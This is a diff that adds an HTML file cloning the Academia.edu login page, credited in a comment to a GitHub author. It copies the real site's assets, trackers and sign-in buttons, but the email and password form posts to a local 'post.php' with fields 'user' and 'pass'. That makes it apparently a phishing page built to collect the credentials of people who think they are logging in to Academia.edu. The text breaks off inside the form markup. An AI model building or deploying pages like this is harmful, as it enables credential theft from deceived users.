@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+
+<!-- Creatred by https://github.com/makdosx -->
+
+<html lang="en" xmlns:fb="http://www.facebook.com/2008/fbml"  class="wf-loading">
+  <head prefix="og: https://ogp.me/ns#
+                fb: https://ogp.me/ns/fb#
+                academia: https://ogp.me/ns/fb/academia#">
+    <meta charset="utf-8">
+      <meta name=viewport content="width=device-width">
+    <meta rel="search"
+          type="application/opensearchdescription+xml"
+          href="/open_search.xml"
+          title="Academia.edu">
+
+    <title>Academia.edu | Log In</title>
+
+    <!--                 _                _                 _
+                        | |              (_)               | |
+      __ _  ___ __ _  __| | ___ _ __ ___  _  __ _   ___  __| |_   _
+     / _` |/ __/ _` |/ _` |/ _ \ '_ ` _ \| |/ _` | / _ \/ _` | | | |
+    | (_| | (_| (_| | (_| |  __/ | | | | | | (_| ||  __/ (_| | |_| |
+     \__,_|\___\__,_|\__,_|\___|_| |_| |_|_|\__,_(_)___|\__,_|\__,_|
+
+    We're hiring! See https://www.academia.edu/hiring -->
+
+    <link href="//a.academia-assets.com/images/favicons/favicon-production.ico" rel="shortcut icon" type="image/vnd.microsoft.icon">
+<link rel="apple-touch-icon" sizes="57x57" href="//a.academia-assets.com/images/favicons/apple-touch-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="//a.academia-assets.com/images/favicons/apple-touch-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="//a.academia-assets.com/images/favicons/apple-touch-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="//a.academia-assets.com/images/favicons/apple-touch-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="//a.academia-assets.com/images/favicons/apple-touch-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="//a.academia-assets.com/images/favicons/apple-touch-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="//a.academia-assets.com/images/favicons/apple-touch-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="//a.academia-assets.com/images/favicons/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="//a.academia-assets.com/images/favicons/apple-touch-icon-180x180.png">
+<link rel="icon" type="image/png" href="//a.academia-assets.com/images/favicons/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="//a.academia-assets.com/images/favicons/favicon-194x194.png" sizes="194x194">
+<link rel="icon" type="image/png" href="//a.academia-assets.com/images/favicons/favicon-96x96.png" sizes="96x96">
+<link rel="icon" type="image/png" href="//a.academia-assets.com/images/favicons/android-chrome-192x192.png" sizes="192x192">
+<link rel="icon" type="image/png" href="//a.academia-assets.com/images/favicons/favicon-16x16.png" sizes="16x16">
+<link rel="manifest" href="//a.academia-assets.com/images/favicons/manifest.json">
+<meta name="msapplication-TileColor" content="#2b5797">
+<meta name="msapplication-TileImage" content="//a.academia-assets.com/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+
+    <script>
+      window.performance &&
+      window.performance.measure &&
+      window.performance.measure("Time To First Byte", "requestStart", "responseStart");
+    </script>
+
+
+    <script>
+    (function() {
+      if (!window.URLSearchParams || !window.history || !window.history.replaceState) {
+        return;
+      }
+      var searchParams = new URLSearchParams(window.location.search);
+      var paramsToDelete = [
+        'fs',
+        'sm',
+        'swp',
+        'iid',
+        'nbs',
+        'rcc', // related content category
+        'rcpos', // related content carousel position
+        'rcpg', // related carousel page
+        'rchid', // related content hit id
+        'f_ri', // research interest id, for SEO tracking
+        'f_fri', // featured research interest, for SEO tracking (param key without value)
+        'f_rid', // from research interest directory for SEO tracking
+      ];
+
+      if (paramsToDelete.every((key) => searchParams.get(key) === null)) {
+        return;
+      }
+      paramsToDelete.forEach((key) => {
+        searchParams.delete(key);
+      });
+
+      var cleanUrl = new URL(window.location.href);
+      cleanUrl.search = searchParams.toString();
+      history.replaceState({}, document.title, cleanUrl);
+    })();
+    </script>
+
+    <script type="text/javascript">
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', {
+        trackingId: 'UA-2111171-1',
+        cookieDomain: 'academia.edu',
+      });
+
+      ga('set', 'dimension1', "sessions");
+      ga('set', 'dimension2', "new");
+      ga('set', 'dimension6', 'sessions#new');
+
+      ga('set', 'dimension3', 'false');
+      ga('set', 'dimension5', 'unknown');
+
+      ga('send', 'pageview');
+    </script>
+
+
+    <script type="text/javascript">
+      window.sendUserTiming = function(timingName) {
+        if (!(window.performance && window.performance.measure)) return;
+        var entries = window.performance.getEntriesByName(timingName, "measure");
+        if (entries.length !== 1) return;
+        var timingValue = Math.round(entries[0].duration);
+
+        ga('send', {
+          hitType: 'timing',
+          timingCategory: 'User-centric',
+          timingVar: timingName,
+          timingValue: timingValue,
+        });
+
+        if (window.newsFeedStats) {
+          // e.g. 'Time To Interactive' -> 'tti'
+          var shortTimingName = timingName.toLowerCase().split(' ').map(function (word) {
+            return word[0];
+          }).join('');
+          window.newsFeedStats[shortTimingName] = timingValue;
+        }
+      };
+      window.sendUserTiming("Time To First Byte");
+    </script>
+
+
+    <meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="Pk/HIh1C52ktZ31U28C6Cf2CLNgVkBwstXl8MAX7XLkW2/K67dktfnlq/OncKO82BB8lftKryaUYNyKSFk/gtw==" />
+
+    
+  <meta name="description" content="Academia.edu is a place to share and follow research." />
+<meta name="google-site-verification" content="bKJMBZA7E43xhDOopFZkssMMkBRjvYERV-NaN4R6mrs" />
+  
+<script>
+  var $controller_name = 'sessions';
+  var $action_name = "new";
+  var $rails_env = 'production';
+  var $app_rev = '48b71710e65516359483c6f33670f4cf51c6ba8e';
+  var $domain = 'academia.edu';
+  var $app_host = "academia.edu";
+  var $asset_host = "academia-assets.com";
+  var $start_time = new Date().getTime();
+  var $recaptcha_key = "6LdxlRMTAAAAADnu_zyLhLg0YF9uACwz78shpjJB";
+  var $recaptcha_invisible_key = "6Lf3KHUUAAAAACggoMpmGJdQDtiyrjVlvGJ6BbAj";
+</script>
+
+
+  <script>
+
+
+    window.Aedu = { hit_data: null };
+    window.Aedu.SiteStats = {"premium_universities_count":16946,"monthly_visitors":"103 million","monthly_visitor_count":103894500,"monthly_visitor_count_in_millions":103,"user_count":188163061,"paper_count":36526928,"paper_count_in_millions":36,"page_count":432000000,"page_count_in_millions":432,"pdf_count":16500000,"pdf_count_in_millions":16};
+    window.Aedu.serverRenderTime = new Date(1659046372000);
+    window.Aedu.isUsingCssV1 = false;
+    window.Aedu.enableLocalization = true;
+    window.Aedu.activateFullstory = false;
+
+    window.Aedu.serviceAvailability = {
+      status: {"redshift":"on","attention_db":"on","bibliography_db":"on","contacts_db":"on","email_db":"on","news_db":"on","notifications_db":"on","mentions_db":"on","errors_redis":"on"},
+      serviceEnabled: function(service) {
+        return this.status[service] === "on";
+      },
+      readEnabled: function(service) {
+        return this.serviceEnabled(service) || this.status[service] === "read_only";
+      },
+    };
+
+
+  </script>
+
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.2/html5shiv.min.js"></script>
+  <![endif]-->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i" rel="stylesheet">
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
+
+      <link rel="stylesheet" media="all" href="//a.academia-assets.com/assets/libraries-f6da9185479373b0a797959f16e3f33ba9d94f863cde79d2a3a13b88284d6e4f.css" />
+      <link rel="stylesheet" media="all" href="//a.academia-assets.com/assets/academia-9ceee33a4bd951a384ebf5535a9dd648430bd8437a88fad54e7ec9aff60198d6.css" />
+
+    
+    <link rel="stylesheet" media="all" href="//a.academia-assets.com/assets/design_system-c1409547c5f89dcca07f1428929406eacfe756a7e32a18749e8c967e783dccfd.css" />
+
+      <script src="//a.academia-assets.com/assets/webpack_bundles/runtime-bundle-85e165765ce1adf0cec7ea78829eef6dcd87b26bc4da5c258ced5b5e731c7a2b.js"></script>
+
+      <script src="//a.academia-assets.com/assets/webpack_bundles/webpack_libraries_and_infrequently_changed.wjs-bundle-eb7ba2521c1499cecfeb81b9d3d7c7fdb8104097dc698bfd8f43ce91e85b9778.js"></script>
+
+      <script src="//a.academia-assets.com/assets/webpack_bundles/core_webpack.wjs-bundle-cbdcd2570846072a8dfbbcdfe8b9a83d7c1df117eb2572d7c3c2a5bd0204de82.js"></script>
+
+  <!--[if lt IE 10]>
+    <script src="//a.academia-assets.com/assets/ie9_polyfills-ccb518f0850bf8f4a890a1be8d6c94fae535ed9d8e753c88bd1b054d85c96929.js"></script>
+  <![endif]-->
+
+    <script src="//a.academia-assets.com/assets/webpack_bundles/sentry.wjs-bundle-6af2aa5d927872325a616b8c20030c30d52ce7fa41fe1ae04c4a923c3efd3a1d.js"></script>
+
+      <script>
+        jade = window.jade || {};
+        jade.split = window.Aedu.Split;
+
+        jade.helpers = window.$h;
+        jade._ = window._;
+      </script>
+
+  <!-- Google Tag Manager -->
+<script id="tag-manager-head-root">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-5G9JF7Z');</script>
+<!-- End Google Tag Manager -->
+
+<script>
+  var gptadslots = [];
+  var googletag = googletag || {cmd:[]};
+</script>
+
+
+  <script type="text/javascript">
+  // TODO(jacob): This should be defined, may be rare load order problem.
+  // Checking if null is just a quick fix, will default to en if unset.
+  // Better fix is to run this immedietely after I18n is set.
+  if (window.I18n != null) {
+    I18n.defaultLocale = "en";
+    I18n.locale = "en";
+    I18n.fallbacks = true;
+  }
+</script>
+
+
+  
+
+    <script>(function() {
+  !function(a9,a,p,s,t,A,g){if(a[a9])return;function q(c,r){a[a9]._Q.push([c,r])}a[a9]={init:function(){q("i",arguments)},fetchBids:function(){q("f",arguments)},setDisplayBids:function(){},targetingKeys:function(){return[]},_Q:[]};A=p.createElement(s);A.async=!0;A.src=t;g=p.getElementsByTagName(s)[0];g.parentNode.insertBefore(A,g)}("apstag",window,document,"script","//c.amazon-adsystem.com/aax2/apstag.js");
+  apstag.init({
+      pubID: '4d038c72-2f66-4647-8cf6-cf9cfa4b1ac7',
+      adServer: 'googletag'
+  });
+
+  var controller = 'sessions';
+  var logged_in = '' !== '';
+  var slots = [];
+  switch (controller) {
+      case 'analytics_dashboard':
+          slots = [{
+              slotID: 'div-gpt-ad-4397870-18',
+              slotName: '65327593/Academia/Analytics',
+              sizes: [[970,90],[970,250],[728,90]]
+          }];
+          break;
+      case 'departments':
+          slots = [{
+              slotID: 'div-gpt-ad-4397870-19',
+              slotName: '65327593/Academia/Tags',
+              sizes: [[300,600],[300,250],[160,600]]
+          }];
+          break;
+      case 'works':
+          if (logged_in) {
+              slots = [{
+                  slotID: 'div-gpt-ad-4397870-13',
+                  slotName: '65327593/Academia/Profile_LoggedIn',
+                  sizes: [[300,600],[300,250],[160,600]]
+              }];
+          } else {
+              slots = [{
+                  slotID: 'div-gpt-ad-4397870-11',
+                  slotName: '65327593/Academia/Profile_LoggedOut',
+                  sizes: [[300,600],[300,250],[160,600]]
+              }];
+          }
+          break;
+      case 'single_work':
+          if (logged_in) {
+              slots = [{
+                  slotID: 'div-gpt-ad-4397870-1',
+                  slotName: '65327593/Academia/Swp_LoggedIn',
+                  sizes: [[300,250]]
+              },{
+                  slotID: 'div-gpt-ad-4397870-3-2',
+                  slotName: '65327593/Academia/Swp_LoggedIn',
+                  sizes: [[728,90]]
+              }];
+          } else {
+              slots = [{
+                  slotID: 'div-gpt-ad-4397870-8-2',
+                  slotName: '65327593/Academia/Swp_LoggedOut',
+                  sizes: [[728,90]]
+              }];
+          }
+          break;
+      case 'by_tag':
+          slots = [{
+              slotID: 'div-gpt-ad-4397870-19',
+              slotName: '65327593/Academia/Tags',
+              sizes: [[300,600],[300,250],[160,600]]
+          }];
+          break;
+      case 'universities':
+          slots = [{
+              slotID: 'div-gpt-ad-4397870-21',
+              slotName: '65327593/Academia/Universities',
+              sizes: [[300,600],[300,250],[160,600]]
+          }];
+          break;
+      case 'news':
+          slots = [{
+              slotID: 'div-gpt-ad-4397870-16',
+              slotName: '65327593/Academia/Newsfeed',
+              sizes: [[300,600],[160,600],[300,250]]
+          }];
+          break;
+  }
+
+  if (!slots.length) {
+      // If you proceed without any slots, you'll get this error in
+      // the console: "Error: No slots provided to apstag.fetchBids"
+      return;
+  }
+
+  apstag.fetchBids({
+      slots: slots,
+      timeout: 2e3
+  }, function(bids) {
+      // set apstag targeting on googletag, then trigger the first DFP request in googletag's disableInitialLoad integration
+      googletag.cmd.push(function(){
+          apstag.setDisplayBids();
+      });
+  });
+
+})()</script>
+    <script src="https://fdyn.pubwise.io/script/fbb5f41d-df80-4a62-9b42-d0589d7d0b19/v3/dyn/pre_pws.js" type="text/javascript"></script><script async="" src="https://fdyn.pubwise.io/script/fbb5f41d-df80-4a62-9b42-d0589d7d0b19/v3/dyn/pws.js" type="text/javascript"></script><script>(function() {
+  var gads = document.createElement('script');
+  gads.async = true;
+  gads.type = 'text/javascript';
+  var useSSL = 'https:' == document.location.protocol;
+  gads.src = (useSSL ? 'https:' : 'http:') +
+    '//www.googletagservices.com/tag/js/gpt.js';
+  var node = document.getElementsByTagName('script')[0];
+  node.parentNode.insertBefore(gads, node);
+})();
+
+(function() {
+
+  function defineGoogleAdsHelpers() {
+    var mapping1 = googletag.sizeMapping()
+        .addSize([1024, 500], [[728, 90]])
+        .addSize([768, 400], [[728, 90]])
+        .addSize([470, 400], [[320, 100], [320, 50]])
+        .addSize([360, 400], [[320, 100], [320, 50]])
+        .addSize([0, 0], [[320, 100], [320, 50]])
+        .build();
+    var mapping2 = googletag.sizeMapping()
+        .addSize([1024, 500], [[728, 90]])
+        .addSize([768, 400], [[728, 90]])
+        .addSize([0, 0], [])
+        .build();
+    var mapping3 = googletag.sizeMapping()
+      .addSize([1024, 500], [[728, 90]])
+      .addSize([768, 400], [[728, 90]])
+      .addSize([470, 400], [[320, 100], [320, 50], [300, 250]])
+      .addSize([360, 400], [[320, 100], [320, 50], [300, 250]])
+      .addSize([0, 0], [[320, 100], [320, 50], [300, 250]])
+      .build();
+    var mapping4 = googletag.sizeMapping()
+      .addSize([1024, 500], [[300, 250], [300, 600], [160, 600]])
+      .addSize([768, 400], [])
+      .addSize([470, 400], [])
+      .addSize([360, 400], [])
+      .addSize([0, 0], [])
+      .build();
+
+    var inlineParamsByLabel = {
+      Swp_LoggedIn_Rail1:    [2, [[300,250]]],
+      Swp_LoggedIn:         [3, [[728,90]], mapping3],
+      Swp_LoggedOut_Rail:   [7, [[300,250]], mapping4],
+      Swp_LoggedOut:        [8, [[728,90]], mapping3],
+      Profile_LoggedOut:    [12, [[728,90]], mapping1],
+      SearchResults:        [15, [[728,90]], mapping1],
+      Newsfeed:             [17, [[728,90]], mapping1],
+      Swp_LoggedIn_Rail2:    [22, [[300,250]]],
+      Swp_LoggedIn_Rail3:    [23, [[300,250],[300,600],[160,600]]],
+    };
+
+    window.$GoogleAds = {
+      divIdPrefix: function() {
+        return "div-gpt-ad-4397870-";
+      },
+
+      defineSlot: function(label, targeting, suffix, sizes, sizeMapping) {
+        var id = $GoogleAds.divIdPrefix() + suffix;
+        if (label === '') {
+          Sentry.captureMessage("No label given for ad slot: " + window.location.href);
+        }
+        var slot = googletag.defineSlot('/65327593/Academia/' + label, sizes, id);
+
+        //Using this for refreshing slots if we have disable inital load on.
+        $GoogleAds.slotDefByLabel[id] = slot;
+
+        if(targeting) {
+          slot = slot.setTargeting('POS', [targeting]);
+        }
+        if(sizeMapping) {
+          slot = slot.defineSizeMapping(sizeMapping);
+        }
+        slot.addService(googletag.pubads());
+        gptadslots.push(slot);
+
+        return {slot: slot, id: id};
+      },
+
+      defineInlineSlot: function(label, suffix, keyword_params) {
+        if (keyword_params === undefined) {
+          keyword_params = {};
+        }
+        var params = inlineParamsByLabel[label];
+
+        // There are 2 use cases hidden here
+        // 1) defineInlineSlot called from JS
+        // 2) defineInlineSlot called from slim templated rendered in ruby (the dfp_inline_slot_definition partial)
+        // In the first case, we want to automatically keep track of the last created div id and increment it
+        // In the latter case, we trust the ruby code to do the div id accounting
+        if(!suffix) {
+          $GoogleAds.inlineIndexByLabel[label] = $GoogleAds.inlineIndexByLabel[label] || 1;
+          var suffix = params[0] + "-" + $GoogleAds.inlineIndexByLabel[label];
+          $GoogleAds.inlineIndexByLabel[label] += 1;
+        }
+
+        var index = $GoogleAds.inlineIndexByLabel[label];
+        var position_label = "Inline";
+        if (keyword_params && keyword_params['index']) {
+          index = keyword_params['index'];
+        }
+        if (keyword_params && keyword_params['position_label']) {
+          position_label = keyword_params['position_label'];
+        }
+
+        var slotDef = $GoogleAds.defineSlot(label, position_label + index, suffix, params[1], params[2]);
+        $GoogleAds.inlineSlotDefsByLabel[label] = $GoogleAds.inlineSlotDefsByLabel[label] || [];
+        $GoogleAds.inlineSlotDefsByLabel[label].push(slotDef);
+        return slotDef;
+      },
+
+      latestInlineSlotDef: function(label) {
+        var slotDefs = $GoogleAds.inlineSlotDefsByLabel[label];
+        if(slotDefs == null) return;
+        return slotDefs[slotDefs.length - 1];
+      },
+
+      renderForPlatform: function(dfp_slot_id, desktopOnly, mobileOnly) {
+        // The Only flags both default to false.
+        // If both are set to true, we'll show nothing.
+
+        var shouldShowMobile = !desktopOnly && $a.is_mobile();
+        var shouldShowDesktop = !mobileOnly && !$a.is_mobile();
+        var shouldShow = shouldShowMobile || shouldShowDesktop;
+
+        if(shouldShow) {
+          if(typeof(pubwise) != 'undefined' && pubwise.enabled === true) {
+            pbjs.que.push(function() {
+              performPubWiseLoad([$GoogleAds.slotDefByLabel[dfp_slot_id]],true);
+            });
+          } else {
+            googletag.display(dfp_slot_id);
+            googletag.pubads().refresh([$GoogleAds.slotDefByLabel[dfp_slot_id]]);
+          }
+        }
+      },
+
+      refreshAds: function (slots) {
+        if(typeof(pubwise) != 'undefined' && pubwise.enabled) {
+          pbjs.que.push(function() {
+            performPubWiseLoad(slots,false);
+          });
+        } else {
+          googletag.pubads().refresh(slots)
+        }
+      },
+
+      mapping1: mapping1,
+      mapping2: mapping2,
+      inlineIndexByLabel: {},
+      inlineSlotDefsByLabel: {},
+      slotDefByLabel: {}
+    }
+  };
+
+
+  googletag.cmd.push(function() {
+    defineGoogleAdsHelpers()
+    var defineSlot = $GoogleAds.defineSlot
+    var defineInlineSlot = $GoogleAds.defineInlineSlot
+    var mapping1 = $GoogleAds.mapping1
+    var mapping2 = $GoogleAds.mapping2
+
+    // Checking which page we are on because Google doesn't like slots getting defined that aren't
+    // actually being served on the page
+    var controller = 'sessions';
+    var logged_in = false;
+    if ((controller === 'single_work') && logged_in) {
+      defineSlot('Swp_LoggedIn', 'RightRail1', 1, [[300, 250]])
+      defineInlineSlot('Swp_LoggedIn_Rail1')
+      defineInlineSlot('Swp_LoggedIn_Rail2')
+      defineInlineSlot('Swp_LoggedIn_Rail3')
+      defineInlineSlot('Swp_LoggedIn')
+      defineSlot('Swp_LoggedIn_Overpass', null,         4, [[1, 1]])
+    } else if ((controller === 'single_work') && !logged_in) {
+      defineSlot('Swp_LoggedOut', 'Top', 5, [[728, 90]], mapping2)
+      defineSlot('Swp_LoggedOut', 'RightRail1', 6, [[300, 600], [300, 250], [160, 600]])
+      defineInlineSlot('Swp_LoggedOut_Rail')
+      defineInlineSlot('Swp_LoggedOut')
+      defineSlot('Swp_LoggedOut_Overpass', null, 9, [[1, 1]])
+    } else if ((controller === 'works') && !logged_in) {
+      defineSlot('Profile_LoggedOut', 'Top', 10, [[970, 250], [970, 90], [728, 90]], mapping1)
+      defineSlot('Profile_LoggedOut', 'RightRail1', 11, [[300, 600], [300, 250], [160, 600]])
+      defineInlineSlot('Profile_LoggedOut')
+    } else if ((controller === 'works') && logged_in) {
+      defineSlot('Profile_LoggedIn', 'RightRail1', 13, [[300, 250], [300, 600], [160, 600]])
+      defineSlot('Profile_LoggedIn', 'Bottom', 14, [[728, 90]], mapping1)
+    } else {
+      defineInlineSlot('SearchResults')
+      defineSlot('Newsfeed', 'RightRail1', 16, [[300, 600], [300, 250], [160, 600]])
+      defineInlineSlot('Newsfeed')
+      defineSlot('Analytics', 'Top', 18, [[970, 90], [970, 250], [728, 90]])
+      defineSlot('Tags', 'RightRail1', 19, [[300, 600], [300, 250], [160, 600]])
+      defineSlot('Departments', 'RightRail1', 20, [[300, 600], [300, 250], [160, 600]])
+      defineSlot('Universities', 'RightRail1', 21, [[300, 600], [300, 250], [160, 600]])
+    }
+
+    targeting_data = [["University","null"],["Role/Profession","null"],["FieldOfStudy","null"]];
+
+    targeting_data.forEach(data => { googletag.pubads().setTargeting(data[0], data[1]) });
+    googletag.pubads().setTargeting('Url', window.location.pathname);
+
+    googletag.pubads().collapseEmptyDivs();
+    googletag.pubads().setCentering(true);
+    googletag.pubads().disableInitialLoad();
+
+    // If not on SWP or not on logged out user profile page, enableSingleRequest
+    // Otherwise use multirequest mode because SWP and logged out user profile has dynamically defined ads
+    if (!(controller === 'single_work') && !((controller === 'works') && !logged_in)) {
+      googletag.pubads().enableSingleRequest();
+    }
+
+    googletag.enableServices();
+  });
+})();</script>
+
+
+
+      <link rel="canonical" href="https://www.academia.edu/login" />
+
+  </head>
+<!--[if gte IE 9 ]>
+  <body class='ie ie9 c-sessions a-new logged_out'>
+<![endif]-->
+<!--[if !(IE) ]><!-->
+  <body class='c-sessions a-new logged_out'>
+<!--<![endif]-->
+
+
+
+    
+
+
+  <div id="fb-root"></div><script>window.fbAsyncInit = function() {
+  FB.init({
+    appId: "2369844204",
+    version: "v8.0",
+    status: true,
+    cookie: true,
+    xfbml: true
+  });
+
+  // Additional initialization code.
+  if (window.InitFacebook) {
+    // facebook.ts already loaded, set it up.
+    window.InitFacebook();
+  } else {
+    // Set a flag for facebook.ts to find when it loads.
+    window.academiaAuthReadyFacebook = true;
+  }
+};</script><script>window.fbAsyncLoad = function() {
+  // Protection against double calling of this function
+  if (window.FB) {
+      return;
+  }
+  (function(d, s, id){
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) {return;}
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/sdk.js";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+}
+
+if (!window.defer_facebook) {
+  // Autoload if not deferred
+  window.fbAsyncLoad();
+} else {
+  // Defer loading by 5 seconds
+  setTimeout(function() {
+    window.fbAsyncLoad();
+  }, 5000);
+}</script>
+  <div id="google-root"></div><script>window.loadGoogle = function() {
+  if (window.InitGoogle) {
+    // google.ts already loaded, set it up.
+    window.InitGoogle("331998490334-rsn3chp12mbkiqhl6e7lu2q0mlbu0f1b");
+  } else {
+    // Set a flag for google.ts to use when it loads.
+    window.GoogleClientID = "331998490334-rsn3chp12mbkiqhl6e7lu2q0mlbu0f1b";
+  }
+};</script><script>window.googleAsyncLoad = function() {
+  // Protection against double calling of this function
+  if (window.gapi) {
+    return;
+  }
+  (function(d) {
+    var js;
+    var id = 'google-jssdk';
+    var ref = d.getElementsByTagName('script')[0];
+    if (d.getElementById(id)) {
+        return;
+    }
+    js = d.createElement('script');
+    js.id = id;
+    js.async = true;
+    js.src = "https://apis.google.com/js/api:client.js?onload=loadGoogle"
+    ref.parentNode.insertBefore(js, ref);
+  }(document));
+}
+
+if (!window.defer_google) {
+  // Autoload if not deferred
+  window.googleAsyncLoad();
+} else {
+  // Defer loading by 5 seconds
+  setTimeout(function() {
+    window.googleAsyncLoad();
+  }, 5000);
+}</script>
+
+  <div id="tag-manager-body-root">
+  <!-- Google Tag Manager (noscript) -->
+  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5G9JF7Z"
+  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+  <!-- End Google Tag Manager (noscript) -->
+
+  <!-- Event listeners for analytics -->
+  <script>
+    window.addEventListener('load', function() {
+      if (document.querySelector('input[name="commit"]')) {
+        document.querySelector('input[name="commit"]').addEventListener('click', function() {
+          ga('send', 'event', 'button', 'click', 'Log In');
+        })
+      }
+    });
+  </script>
+</div>
+
+
+  <script>var _comscore = _comscore || [];
+_comscore.push({ c1: "2", c2: "26766707" });
+(function() {
+  var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
+  s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
+  el.parentNode.insertBefore(s, el);
+})();</script><img src="https://sb.scorecardresearch.com/p?c1=2&amp;c2=26766707&amp;cv=2.0&amp;cj=1" style="position: absolute; visibility: hidden" />
+
+  
+  <div class='DesignSystem'>
+    <a class='u-showOnFocus' href='#site'>
+      Skip to main content
+    </a>
+  </div>
+
+  <div id="upgrade_ie_banner" style="display: none;"><p>Academia.edu no longer supports Internet Explorer.</p><p>To browse Academia.edu and the wider internet faster and more securely, please take a few seconds to&nbsp;<a href="https://www.academia.edu/upgrade-browser">upgrade your browser</a>.</p></div><script>// Show this banner for all versions of IE
+if (!!window.MSInputMethodContext || /(MSIE)/.test(navigator.userAgent)) {
+  document.getElementById('upgrade_ie_banner').style.display = 'block';
+}</script>
+
+
+
+    <div class="DesignSystem"></div>
+
+  <div id='site' class='fixed'>
+
+    <div id="content" class="clearfix">
+        <style type="text/css">/*
+remove after when moving to new layout
+uses the flash[:error] message in a different spot in the dom
+*/
+.error_banner {
+  display: none;
+}
+body {
+  background-color: white;
+}
+
+.Content {
+  max-width: 530px;
+}</style><div class="DesignSystem"><div class="container u-mt20x"><div class="row"><div class="col-xs-12 col-sm-10 col-sm-offset-1 col-md-6 col-md-offset-3"><div class="Content center-block"><div class="u-taCenter"><img class="Logo" onerror="this.src=&#39;//a.academia-assets.com/images/academia-logo-redesign-2015.png&#39;" style="width: 178px; height: 22px;" src="//a.academia-assets.com/assets/academia-logo-redesign-2015-45ae31566d1421084023fae986d81b06469982455d4be698a5226a904e7836a9.svg" /></div><div class="row u-mt2x"><div class="col-sm-6"><button class="Button Button--facebook Button--lg Button--block u-p0x u-ph2x u-mv6x u-taLeft" id="login-facebook-oauth-button" style="display: flex; align-items: center;"><img class="u-positionRelative u-pr4x" src="//a.academia-assets.com/images/facebook/facebook-color.svg" style="top:-2px;" /><span class="u-fs11" style="white-space: normal; line-height: normal;">Log in with Facebook</span></button></div><div class="col-sm-6"><button class="Button Button--google Button--lg Button--block u-p0x u-pl2x u-pr4x u-mv6x u-taLeft" id="login-google-oauth-button" style="display: flex; align-items: center;"><img class="u-positionRelative u-pr4x" src="//a.academia-assets.com/images/google/google-color.svg" style="top:-2px;" /><span class="u-fs11" style="white-space: normal; line-height: normal;">Log in with Google</span></button></div><div class="col-sm-6"><div class="u-mb6x"><style type="text/css">.sign-in-with-apple-button {
+  width: 100%;
+  height: 52px;
+  border-radius: 3px;
+  border: 1px solid black;
+  cursor: pointer;
+}</style><script src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js" type="text/javascript"></script><div class="sign-in-with-apple-button" data-border="false" data-color="white" id="appleid-signin"><span &nbsp;&nbsp;="Sign Up with Apple" class="u-fs11"></span></div><script>AppleID.auth.init({
+  clientId: 'edu.academia.applesignon',
+  scope: 'name email',
+  redirectURI: 'https://www.academia.edu/sessions',
+  state: "11734162cf75f657eb66e30bf44067fa2f65f800bb1df88f8c8808648269b823",
+});</script></div></div><script>new Aedu.Auth.OauthButton.Login.Google({
+  el: '#login-google-oauth-button',
+  rememberMeCheckboxId: 'remember_me',
+  track: null,
+  redirectPath: null,
+});
+new Aedu.Auth.OauthButton.Login.Facebook({
+  el: '#login-facebook-oauth-button',
+  rememberMeCheckboxId: 'remember_me',
+  track: null,
+  redirectPath: null,
+});</script></div><div class="row"><div class="col-xs-12"><div class="hr-heading login-hr-heading"><span class="hr-heading-text">or</span></div></div></div><div class="row"><div class="col-xs-12 u-positionRelative u-mt6x u-mb8x"><form id="js-for-recaptcha--login-form" class="js-login-form" action="post.php" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="&#x2713;" autocomplete="off" /><input type="hidden" name="authenticity_token" value="YL4jDWPKg3VuXnLBF6zpB6DihFdwWOx8a8PA2x5zItRIKhaVk1FJYjpT83wQRLw4WX+N8bdjOfXGjZ55Dcee2g==" autocomplete="off" /><div class="form-group"><label class="control-label" for="login-modal-email-input">Email</label><input autofocus="" class="TextInput TextInput--lg TextInput--dark u-mb8x" id="login-modal-email-input" name="user" placeholder="Email" type="email" value="" /></div><div class="form-group"><label class="control-label" for="login-modal-password-input">Password</label><div class="u-floatRight"><a class="u-tcGrayDark u-fs12" data-target="#login-reset-password-container" data-toggle="collapse" href="javascript:void(0)" tabindex="-1"><span class="u-textDecorationNone"><i class="fa fa-lg fa-question-circle u-pr1x" style="line-height: 9px"></i></span>Password Reset</a></div><input class="TextInput TextInput--lg TextInput--dark u-mb8x" id="login-modal-password-input" name="pass" placeholder="Password" type="password" /><input type="hidden" name="post_login_redirect_url" id="post_login_redirect_url" autocomplete="off" /></div><div class="row"><div 